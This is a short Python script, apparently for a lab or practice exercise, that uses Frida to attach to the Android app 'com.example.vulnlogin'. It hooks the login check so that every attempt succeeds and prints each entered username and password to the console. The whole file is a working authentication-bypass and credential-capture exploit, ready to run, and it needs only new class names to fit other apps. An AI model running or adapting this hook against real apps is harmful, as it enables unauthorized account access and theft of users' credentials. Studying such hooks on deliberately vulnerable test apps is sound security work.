#!/usr/bin/env python3

import frida
import sys

def verify_bypass():
    device = frida.get_usb_device()
    session = device.attach("com.example.vulnlogin")
    
    script = session.create_script("""
    Java.perform(function() {
        var LoginActivity = Java.use("com.example.vulnlogin.LoginActivity");
        
        LoginActivity.validateCredentials.implementation = function(username, password) {
            var result = this.validateCredentials(username, password);
            send({"original_result": result, "username": username, "password": password});
            return true; // Force bypass
        };
    });
    """)
    
    def on_message(message, data):
        if message['type'] == 'send':
            payload = message['payload']
            print(f"[+] Bypass verified - Original result: {payload['original_result']}")
            print(f"[+] Credentials: {payload['username']}/{payload['password']}")
    
    script.on('message', on_message)
    script.load()
    
    print("[+] Verification script loaded. Test login in the app.")
    sys.stdin.read()

if __name__ == "__main__":
    verify_bypass()
